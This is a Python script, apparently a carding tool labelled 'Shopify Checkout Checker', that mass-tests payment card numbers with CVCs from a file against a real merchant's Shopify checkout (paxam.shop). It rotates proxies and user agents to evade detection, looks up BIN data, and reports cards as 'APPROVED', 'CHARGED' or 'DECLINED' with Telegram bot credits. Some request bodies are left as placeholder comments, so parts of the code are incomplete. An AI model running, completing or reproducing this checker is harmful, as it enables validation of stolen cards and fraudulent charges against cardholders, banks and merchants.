import requests
import os
import re
import random
import string
import time
import json
import uuid
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_rotating_user_agent():
    agents = [
        "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def generate_random_email():
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    unique_id = str(uuid.uuid4())[:8]
    return f'{random_part}_{unique_id}_{timestamp}@gmail.com'

def parse_proxy(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def load_proxies():
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def load_cards():
    if os.path.exists('cards.txt'):
        with open('cards.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        return cards
    return []

def get_bin_info(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def find_between(s, start, end):
    try:
        return s.split(start)[1].split(end)[0]
    except IndexError:
        return None

def extract_error_from_response(response_text):
    try:
        # First, try to extract from JSON response
        try:
            data = json.loads(response_text)
            if isinstance(data, dict):
                # Check for Shopify specific error patterns
                if 'errors' in data:
                    errors = data['errors']
                    if isinstance(errors, list) and len(errors) > 0:
                        return str(errors[0])
                
                # Check for error in data section
                if 'data' in data and 'submitForCompletion' in data['data']:
                    submit_data = data['data']['submitForCompletion']
                    if 'errors' in submit_data:
                        errors = submit_data['errors']
                        if isinstance(errors, list) and len(errors) > 0:
                            error_obj = errors[0]
                            if 'localizedMessage' in error_obj:
                                return error_obj['localizedMessage']
                            elif 'code' in error_obj:
                                return error_obj['code']
                
                # Check for direct error message
                if 'error' in data:
                    error_msg = data['error']
                    if isinstance(error_msg, dict) and 'message' in error_msg:
                        return error_msg['message']
                    else:
                        return str(error_msg)
                
                # Check for message field
                if 'message' in data:
                    return data['message']
        except:
            pass
        
        # Try to find specific error patterns in text
        patterns = [
            r'"message"\s*:\s*"([^"]+)"',
            r'"localizedMessage"\s*:\s*"([^"]+)"',
            r'"code"\s*:\s*"([^"]+)"',
            r'decline[^"]*"([^"]+)"',
            r'declined[^"]*"([^"]+)"',
            r'insufficient[^"]*"([^"]+)"',
            r'expired[^"]*"([^"]+)"',
            r'invalid[^"]*"([^"]+)"',
            r'cvc[^"]*"([^"]+)"',
            r'security[^"]*"([^"]+)"',
            r'incorrect[^"]*"([^"]+)"',
            r'do_not_honor[^"]*"([^"]+)"',
            r'pickup_card[^"]*"([^"]+)"',
            r'restricted_card[^"]*"([^"]+)"',
            r'card_not_supported[^"]*"([^"]+)"',
            r'generic_decline[^"]*"([^"]+)"',
            r'transaction_not_allowed[^"]*"([^"]+)"',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                # Return the first match that's not empty
                for match in matches:
                    if match and match.strip():
                        return match.strip()
        
        # Look for specific error codes
        error_codes = re.findall(r'"code"\s*:\s*"([^"]+)"', response_text)
        if error_codes:
            return f"Error code: {error_codes[0]}"
        
        # Look for decline reasons
        if 'declined' in response_text.lower():
            return "Card declined"
        if 'insufficient' in response_text.lower():
            return "Insufficient funds"
        if 'expired' in response_text.lower():
            return "Card expired"
        if 'cvc' in response_text.lower() or 'security code' in response_text.lower():
            return "Incorrect CVC"
        if 'invalid' in response_text.lower():
            return "Invalid card details"
        
        # Default message
        return "Payment failed"
        
    except Exception as e:
        return f"Error extracting message: {str(e)}"

def check_card_shopify(cc_line):
    start_time = time.time()
    max_retries = 2
    
    for attempt in range(max_retries):
        try:
            ccx = cc_line.strip()
            n, mm, yy, cvc = ccx.split("|")
            
            if not yy.startswith('20'):
                yy = '20' + yy
            
            bin_info = get_bin_info(n[:6])
            
            session = requests.Session()
            session.headers.update({'user-agent': get_rotating_user_agent()})
            
            proxies_list = load_proxies()
            if not proxies_list:
                proxy_str = None
                chosen_proxy = None
            else:
                proxy_str = random.choice(proxies_list)
                chosen_proxy = proxy_str
            
            if chosen_proxy:
                print(f"Using proxy: {chosen_proxy}")
                proxies = parse_proxy(chosen_proxy)
                if proxies:
                    session.proxies.update(proxies)
            
            user_agents = get_rotating_user_agent()
            
            # Add debug prints
            print(f"Processing card: {n[:6]}******")
            print("Step 1: Adding product to cart...")
            
            headers = {
                'authority': 'paxam.shop',
                'accept': 'application/javascript',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
                'origin': 'https://paxam.shop',
                'referer': 'https://paxam.shop/products/self-portrait-cd',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agents
            }

            data = {
                'quantity': '1',
                'form_type': 'product',
                'utf8': '✓',
                'id': '47328922632437',
                'product-id': '9426412044533',
                'section-id': 'template--18302998610165__main',
                'sections': 'cart-notification-product,cart-notification-button,cart-icon-bubble',
                'sections_url': '/products/self-portrait-cd',
            }
            
            try:
                response = session.post('https://paxam.shop/cart/add', headers=headers, data=data, timeout=30, verify=False)
                print(f"Add to cart response: {response.status_code}")
            except requests.exceptions.ProxyError as e:
                if "402" in str(e) or '407' in str(e):
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ 402 proxy payment required
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Proxy error: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            print("Step 2: Getting cart token...")
            headers = {
                'authority': 'paxam.shop',
                'accept': '*/*',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
                'referer': 'https://paxam.shop/cart',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agents,
            }

            params = {
                'timestamp': '1754988478005',
            }

            response = session.get('https://paxam.shop/cart.js', params=params, headers=headers, timeout=30, verify=False)
            print(f"Cart response: {response.status_code}")

            try:
                chk_token = response.json()["token"]
                print(f"Cart token: {chk_token}")
            except:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to get cart token
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            time.sleep(0.5)

            print("Step 3: Getting checkout page...")
            headers = {
                'authority': 'paxam.shop',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
                'cache-control': 'max-age=0',
                'referer': 'https://paxam.shop/products/self-portrait-cd',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agents,
            }

            response = session.get(f'https://paxam.shop/checkouts/cn/{chk_token}', headers=headers, timeout=30, verify=False)
            print(f"Checkout page: {response.status_code}")

            x_checkout_one_session_token = re.search(
                r'name="serialized-session-token" content="&quot;([^&]+)&quot;"', response.text)

            queue_token = re.search(
                r'queueToken&quot;:&quot;([^&]+)&quot;', response.text)

            stable_id = re.search(
                r'stableId&quot;:&quot;([^&]+)&quot;', response.text)

            paymentMethodIdentifier = re.search(
                r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', response.text)

            x_checkout_one_session_token = x_checkout_one_session_token.group(1) if x_checkout_one_session_token else None
            queue_token = queue_token.group(1) if queue_token else None
            stable_id = stable_id.group(1) if stable_id else None
            paymentMethodIdentifier = paymentMethodIdentifier.group(1) if paymentMethodIdentifier else None

            if (
                x_checkout_one_session_token is None or
                queue_token is None or
                stable_id is None or
                paymentMethodIdentifier is None
            ):
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘆𝗲 ⇾ Failed to extract checkout tokens
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                print("Checkout Tokens Found:")
                print(f"Session Token: {x_checkout_one_session_token[:20]}...")
                print(f"Queue Token: {queue_token[:20]}...")
                print(f"Stable ID: {stable_id}")
                print(f"Payment Method ID: {paymentMethodIdentifier}")
            
            time.sleep(0.5)

            print("Step 4: Creating payment session...")
            headers = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/build/102f5ed/number-ltr.html?identifier=&locationURL=',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agents,
            }

            json_data = {
                'credit_card': {
                    'number': n,
                    'month': mm,
                    'year': yy,
                    'verification_value': cvc,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': 'Nickrheb chos',
                },
                'payment_session_scope': 'paxam.shop',
            }

            response = session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, timeout=30, verify=False)
            print(f"Payment session response: {response.status_code}")
            print(f"Payment session response text: {response.text[:200]}...")

            try:
                payment_session_id = response.json()["id"]
                print(f"Payment session ID: {payment_session_id}")
            except Exception as e:
                elapsed_time = time.time() - start_time
                error_msg = extract_error_from_response(response.text)
                print(f"Payment session error: {error_msg}")
                
                if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                    return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            time.sleep(0.5)

            print("Step 5: Submitting order...")
            headers = {
                'authority': 'paxam.shop',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': 'https://paxam.shop',
                'referer': 'https://paxam.shop/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': user_agents,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': '3069eb618dfd384b317acd940cf92385a7bf7fca',
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': chk_token,
            }

            params = {
                'operationName': 'SubmitForCompletion',
            }

            # [Keep the original json_data here - it's too long to include]
            # Use the exact same json_data from your working code
            
            response = session.post(
                'https://paxam.shop/checkouts/unstable/graphql',
                params=params,
                headers=headers,
                json=json_data,  # Use your original json_data
                timeout=30,
                verify=False
            )
            
            print(f"Submit order response: {response.status_code}")
            print(f"Submit order response preview: {response.text[:500]}...")

            try:
                receipt_id = response.json()['data']['submitForCompletion']['receipt']['id']
                print(f"Receipt ID: {receipt_id}")
            except Exception as e:
                decline_code = find_between(response.text, '"localizedMessageHtml":null,"message":{"code":"', '"')
                if decline_code:
                    error_msg = decline_code
                    print(f"Decline code found: {error_msg}")
                else:
                    error_msg = extract_error_from_response(response.text)
                    print(f"Error extracted: {error_msg}")
                
                elapsed_time = time.time() - start_time
                
                error_lower = error_msg.lower()
                if 'cvc' in error_lower or 'security code' in error_lower:
                    return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            time.sleep(0.5)

            print("Step 6: Polling for receipt...")
            headers = {
                'authority': 'paxam.shop',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': 'https://paxam.shop',
                'referer': 'https://paxam.shop/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': user_agents,
                'x-checkout-one-session-token': x_checkout_one_session_token,
                'x-checkout-web-build-id': '3069eb618dfd384b317acd940cf92385a7bf7fca',
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': chk_token,
            }

            params = {
                'operationName': 'PollForReceipt',
            }

            # [Keep the original poll json_data here]
            # Use the exact same poll json_data from your working code
            
            response = session.post(
                'https://paxam.shop/checkouts/unstable/graphql',
                params=params,
                headers=headers,
                json=json_data,  # Use your original poll json_data
                timeout=30,
                verify=False
            )
            
            print(f"Poll response: {response.status_code}")
            print(f"Poll response preview: {response.text[:500]}...")

            result = response.text

            success_keywords = [
                "SUCCESS",
                "ThankYou",
                "Thank you",
                "thank_you",
                "success",
                "Your order is confirmed",
                "your order is confirmed",
                "classicThankYouPageUrl",
                '"__typename":"ProcessedReceipt"',
            ]

            elapsed_time = time.time() - start_time

            if any(keyword in result for keyword in success_keywords):
                return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Order confirmed successfully🔥| CHARGED 🔥
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            elif '"__typename":"ActionRequiredReceipt"' in result:
                return f"""
APPROVED 3DS ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ 3D Secure verification required
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            else:
                try:
                    xebec = response.json()['data']['receipt']['processingError']['code']
                    error_msg = xebec
                    print(f"Processing error: {error_msg}")
                except:
                    error_msg = extract_error_from_response(result)
                    print(f"Extracted error: {error_msg}")
                
                error_lower = error_msg.lower()
                if 'cvc' in error_lower or 'security code' in error_lower:
                    return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError) as e:
            print(f"Network error on attempt {attempt + 1}: {str(e)}")
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {max_retries} retries
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        except Exception as e:
            elapsed_time = time.time() - start_time
            error_msg = str(e)
            print(f"General error: {error_msg}")
            if len(error_msg) > 100:
                error_msg = error_msg[:100] + "..."
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    elapsed_time = time.time() - start_time
    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Max retries exceeded
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify Checkout

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_shopify(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_shopify(cc_line)
        results.append(result)
        time.sleep(2)  # Delay between checks
    return results


if __name__ == "__main__":
    print("Shopify Checkout Checker")
    print("=" * 50)
    
    cards = load_cards()
    if not cards:
        print("No cards found in cards.txt")
        test_cc = input("Enter test CC (format: number|mm|yy|cvc): ").strip()
        if test_cc:
            result = check_card_shopify(test_cc)
            print(result)
    else:
        print(f"Loaded {len(cards)} cards from cards.txt")
        print("Starting mass check...")
        results = check_cards_shopify(cards)
        for result in results:
            print(result)
            print("-" * 50)
